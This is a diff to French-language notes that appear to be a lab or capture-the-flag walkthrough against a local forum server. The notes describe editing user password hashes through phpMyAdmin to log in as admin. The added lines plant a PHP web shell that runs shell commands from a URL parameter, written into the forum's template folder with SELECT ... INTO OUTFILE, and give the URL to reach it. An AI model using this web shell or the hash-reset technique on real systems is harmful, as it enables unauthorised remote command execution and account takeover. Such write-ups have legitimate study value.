@@ -69,7 +69,7 @@ https://192.168.1.139:443/phpmyadmin/
 
 section forum_db on peut voit dans mlf2_userdata qu'on peut edit les users dont leurs mot de passes hached 
 
-manque plus qu'a savoir comment c'est hash, poour ca direction le code src du projet et bingo :
+manque plus qu'a savoir comment c'est hash, pour ca direction le code src du projet et bingo :
 
 function generate_pw_hash($pw)
  {
@@ -86,3 +86,8 @@ function generate_pw_hash($pw)
 
 on modifie le hash de l'admin et bingo on peut se co avec 
 admin admin
+
+SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET["cmd"]) {system($_GET["cmd"]);} ?></pre></BODY></HTML>'
+INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
+
+https://192.168.1.139/forum/templates_c/cmd.php
